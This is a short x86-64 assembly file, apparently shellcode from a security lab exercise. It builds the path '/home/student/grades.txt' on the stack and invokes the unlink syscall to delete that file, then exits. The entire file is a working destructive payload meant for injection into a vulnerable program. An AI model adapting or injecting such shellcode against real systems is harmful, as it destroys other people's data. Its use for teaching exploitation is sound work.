#include <sys/syscall.h>

.globl main
    .type   main, @function

 main:
    /* store the string on the stack */
    xorq  %rax, %rax
    pushq %rax
    movq  $0x7478742e73656461, %rax /* "ades.txt" */
    pushq %rax
    movq  $0x72672f746e656475, %rax /* "udent/gr" */
    pushq %rax
    movq  $0x74732f656d6f682f, %rax /* "/home/st" */
    pushq %rax

    /* unlink(rsp) */
    pushq %rsp
    popq  %rdi
    movq  $87, %rax /* SYS_unlink */
    syscall

    /* exit() */
    xorq  %rdi, %rdi
    movq  $60, %rax /* SYS_exit */
    syscall